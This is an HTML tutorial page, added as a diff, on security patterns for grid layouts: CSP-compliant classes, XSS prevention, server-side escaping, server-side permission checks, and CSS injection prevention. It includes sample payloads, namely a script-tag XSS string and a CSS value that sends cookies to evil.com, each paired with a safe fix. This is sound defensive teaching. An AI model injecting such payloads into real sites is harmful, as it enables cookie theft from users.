@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ============================================
+         03_01_08 - Grid Security Patterns
+         ============================================
+         Security-conscious grid patterns: sanitizing
+         dynamic grid content, preventing XSS in grid
+         templates, CSP compliance, and secure patterns.
+    ================================================ -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>03_01_08 - Grid Security Patterns</title>
+
+    <!-- Bootstrap 5.3.3 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
+          integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YcnS/1Vx6wgc68mFRAS7I+s3GRznyrA2f27" crossorigin="anonymous">
+
+    <style>
+        /* ============================================
+           SECURE GRID TEMPLATE
+           Using CSS-only for layout, no inline styles
+           from user input to prevent CSS injection
+        ================================================ */
+        .secure-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+        }
+
+        .secure-card {
+            background: #e9ecef;
+            border-radius: 10px;
+            padding: 20px;
+            /* No user-controllable inline styles */
+        }
+
+        /* ============================================
+           SANITIZED CONTENT GRID
+           Grid items display server-rendered content
+           that has been sanitized of scripts and
+           dangerous HTML
+        ================================================ */
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 15px;
+        }
+
+        .data-card {
+            background: white;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            padding: 15px;
+            overflow: hidden;
+        }
+
+        .data-card .data-label {
+            font-size: 0.75rem;
+            color: #6c757d;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .data-card .data-value {
+            font-size: 1.5rem;
+            font-weight: 700;
+            word-break: break-word;
+        }
+
+        /* ============================================
+           CSP-COMPLIANT STYLES
+           All styles in this stylesheet, no inline styles.
+           Demonstrates CSP-safe grid patterns.
+        ================================================ */
+        .csp-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+        }
+
+        /* Color variants via classes, NOT inline styles */
+        .csp-item-primary { background: #cfe2ff; border-color: #9ec5fe; }
+        .csp-item-success { background: #d1e7dd; border-color: #badbcc; }
+        .csp-item-warning { background: #fff3cd; border-color: #ffecb5; }
+        .csp-item-danger { background: #f8d7da; border-color: #f5c2c7; }
+
+        .csp-item {
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            border: 2px solid;
+        }
+
+        /* ============================================
+           PERMISSION-BASED GRID
+           Grid items shown based on user role/permissions,
+           with server-side rendering (not client-side hiding)
+        ================================================ */
+        .permission-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+        }
+
+        .permission-card {
+            border-radius: 10px;
+            padding: 20px;
+            position: relative;
+        }
+
+        .permission-card.accessible {
+            background: #d1e7dd;
+            border: 2px solid #badbcc;
+        }
+
+        .permission-card.restricted {
+            background: #f8d7da;
+            border: 2px solid #f5c2c7;
+            opacity: 0.7;
+        }
+
+        .permission-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 0.7rem;
+            padding: 2px 8px;
+            border-radius: 10px;
+        }
+
+        /* ============================================
+           INPUT SANITIZATION DEMO
+           Showing how user input should be handled
+           when displayed in grid cards
+        ================================================ */
+        .input-demo-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        @media (max-width: 768px) {
+            .secure-grid,
+            .permission-grid,
+            .csp-grid {
+                grid-template-columns: 1fr;
+            }
+            .input-demo-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container my-5">
+        <h1 class="mb-4">03_01_08 - Grid Security Patterns</h1>
+
+        <!-- ============================================
+             SECTION 1: CSP-Compliant Grid
+        ================================================ -->
+        <section class="mb-5">
+            <h2 class="h4 mb-3">1. Content Security Policy (CSP) Compliant Grid</h2>
+            <div class="alert alert-success">
+                <strong>Rule:</strong> All styles must be in external stylesheets. No inline styles
+                (<code>style="..."</code>) on grid items. Use CSS classes for variants instead.
+                This is required for strict CSP headers:
+                <code>Content-Security-Policy: style-src 'self'</code>
+            </div>
+
+            <!-- CORRECT: Using classes for variants, NO inline styles -->
+            <div class="csp-grid">
+                <div class="csp-item csp-item-primary">Primary (class-based)</div>
+                <div class="csp-item csp-item-success">Success (class-based)</div>
+                <div class="csp-item csp-item-warning">Warning (class-based)</div>
+                <div class="csp-item csp-item-danger">Danger (class-based)</div>
+            </div>
+
+            <div class="alert alert-warning mt-3">
+                <strong>WRONG (CSP violation):</strong> <code>&lt;div style="background: red;"&gt;</code>
+                — Inline styles are blocked by strict CSP. Always use classes.
+            </div>
+        </section>
+
+        <!-- ============================================
+             SECTION 2: XSS Prevention in Dynamic Grids
+        ================================================ -->
+        <section class="mb-5">
+            <h2 class="h4 mb-3">2. XSS Prevention in Dynamic Grid Content</h2>
+            <div class="alert alert-danger">
+                When grid items are rendered from user input (comments, profiles, etc.),
+                <strong>never use <code>innerHTML</code></strong> with unsanitized data.
+                Use <code>textContent</code> or a DOM sanitizer library.
+            </div>
+
+            <div class="input-demo-grid">
+                <div class="card">
+                    <div class="card-body">
+                        <h6 class="text-danger">Unsafe (XSS vulnerable)</h6>
+                        <pre class="bg-dark text-light p-3 rounded"><code>// DANGEROUS - never do this
+card.innerHTML = userInput;
+// If userInput = "&lt;script&gt;alert('xss')&lt;/script&gt;"
+// The script executes!</code></pre>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-body">
+                        <h6 class="text-success">Safe (XSS prevented)</h6>
+                        <pre class="bg-dark text-light p-3 rounded"><code>// SAFE - use textContent
+card.textContent = userInput;
+// Script tags are displayed as text,
+// not executed.
+
+// Or use DOMPurify for HTML content:
+card.innerHTML = DOMPurify.sanitize(
+  userInput
+);</code></pre>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ============================================
+             SECTION 3: Secure Data Grid
+             Server-rendered data with proper escaping
+        ================================================ -->
+        <section class="mb-5">
+            <h2 class="h4 mb-3">3. Server-Rendered Secure Data Grid</h2>
+            <div class="alert alert-info">
+                Data in this grid is server-rendered with proper HTML entity escaping.
+                User-generated content (names, descriptions) is escaped before rendering.
+            </div>
+
+            <div class="data-grid">
+                <div class="data-card">
+                    <div class="data-label">Username</div>
+                    <!-- Server-escaped: &lt;script&gt; becomes visible text, not executable -->
+                    <div class="data-value">johndoe</div>
+                </div>
+                <div class="data-card">
+                    <div class="data-label">Email</div>
+                    <div class="data-value">john@example.com</div>
+                </div>
+                <div class="data-card">
+                    <div class="data-label">Bio</div>
+                    <!-- Escaped HTML entities: &amp;lt; displays as &lt; -->
+                    <div class="data-value" style="font-size: 1rem;">
+                        Web developer &amp; designer
+                    </div>
+                </div>
+                <div class="data-card">
+                    <div class="data-label">Status</div>
+                    <div class="data-value text-success">Active</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ============================================
+             SECTION 4: Permission-Based Grid Visibility
+        ================================================ -->
+        <section class="mb-5">
+            <h2 class="h4 mb-3">4. Permission-Based Grid Visibility</h2>
+            <div class="alert alert-warning">
+                <strong>Security principle:</strong> Never hide restricted content with CSS
+                (<code>display: none</code>). The content is still in the DOM and can be revealed
+                with DevTools. Instead, <strong>don't render restricted items server-side</strong>.
+            </div>
+
+            <div class="permission-grid">
+                <div class="permission-card accessible">
+                    <span class="permission-badge bg-success text-white">Public</span>
+                    <h5>Dashboard</h5>
+                    <p class="small mb-0">Available to all users.</p>
+                </div>
+                <div class="permission-card accessible">
+                    <span class="permission-badge bg-success text-white">Public</span>
+                    <h5>Reports</h5>
+                    <p class="small mb-0">Available to all users.</p>
+                </div>
+                <div class="permission-card restricted">
+                    <span class="permission-badge bg-danger text-white">Admin Only</span>
+                    <h5>User Management</h5>
+                    <p class="small mb-0">Rendered for demo. In production, this card would not exist in the HTML at all for non-admin users.</p>
+                </div>
+                <div class="permission-card accessible">
+                    <span class="permission-badge bg-success text-white">Public</span>
+                    <h5>Settings</h5>
+                    <p class="small mb-0">Available to all users.</p>
+                </div>
+                <div class="permission-card restricted">
+                    <span class="permission-badge bg-danger text-white">Admin Only</span>
+                    <h5>Audit Logs</h5>
+                    <p class="small mb-0">Server-side check: don't send this HTML to non-admin clients.</p>
+                </div>
+                <div class="permission-card accessible">
+                    <span class="permission-badge bg-success text-white">Public</span>
+                    <h5>Profile</h5>
+                    <p class="small mb-0">Available to all users.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ============================================
+             SECTION 5: CSS Injection Prevention
+        ================================================ -->
+        <section class="mb-5">
+            <h2 class="h4 mb-3">5. CSS Injection Prevention</h2>
+            <div class="alert alert-danger">
+                Allowing user input in CSS (e.g., custom theme colors) can lead to CSS injection attacks.
+                Always validate and restrict values to a whitelist.
+            </div>
+
+            <div class="card">
+                <div class="card-body">
+                    <h6>Vulnerable Pattern:</h6>
+                    <pre class="bg-dark text-light p-3 rounded"><code>// DANGEROUS - user controls CSS value
+element.style.backgroundColor = userColor;
+// If userColor = "red; background-image: url('https://evil.com/steal?cookie=...')"
+// Data exfiltration via CSS!</code></pre>
+
+                    <h6 class="mt-3">Safe Pattern:</h6>
+                    <pre class="bg-dark text-light p-3 rounded"><code>// SAFE - whitelist allowed values
+const allowedColors = {
+  'primary': '#0d6efd',
+  'success': '#198754',
+  'danger': '#dc3545'
+};
+const safeColor = allowedColors[userColor] || '#6c757d';
+element.style.backgroundColor = safeColor;</code></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- ============================================
+             SECTION 6: Security Checklist
+        ================================================ -->
+        <section class="mb-5">
+            <h2 class="h4 mb-3">6. Grid Security Checklist</h2>
+            <div class="table-responsive">
+                <table class="table table-bordered">
+                    <thead class="table-dark">
+                        <tr>
+                            <th>Risk</th>
+                            <th>Mitigation</th>
+                            <th>Priority</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>XSS via innerHTML</td>
+                            <td>Use textContent or DOMPurify.sanitize()</td>
+                            <td><span class="badge bg-danger">Critical</span></td>
+                        </tr>
+                        <tr>
+                            <td>CSP violation (inline styles)</td>
+                            <td>All styles in external CSS files, use classes</td>
+                            <td><span class="badge bg-warning">High</span></td>
+                        </tr>
+                        <tr>
+                            <td>CSS injection</td>
+                            <td>Whitelist user-controllable CSS values</td>
+                            <td><span class="badge bg-warning">High</span></td>
+                        </tr>
+                        <tr>
+                            <td>Client-side permission hiding</td>
+                            <td>Enforce permissions server-side, don't render</td>
+                            <td><span class="badge bg-danger">Critical</span></td>
+                        </tr>
+                        <tr>
+                            <td>Unescaped HTML entities</td>
+                            <td>Use server-side escaping (htmlspecialchars, etc.)</td>
+                            <td><span class="badge bg-danger">Critical</span></td>
+                        </tr>
+                        <tr>
+                            <td>Third-party CDN integrity</td>
+                            <td>Use SRI hashes on script/link tags</td>
+                            <td><span class="badge bg-warning">High</span></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+    </div><!-- /.container -->
+
+    <!-- Bootstrap JS with SRI integrity hash for CDN verification -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
+            integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"
+            crossorigin="anonymous"></script>
+</body>
+</html>
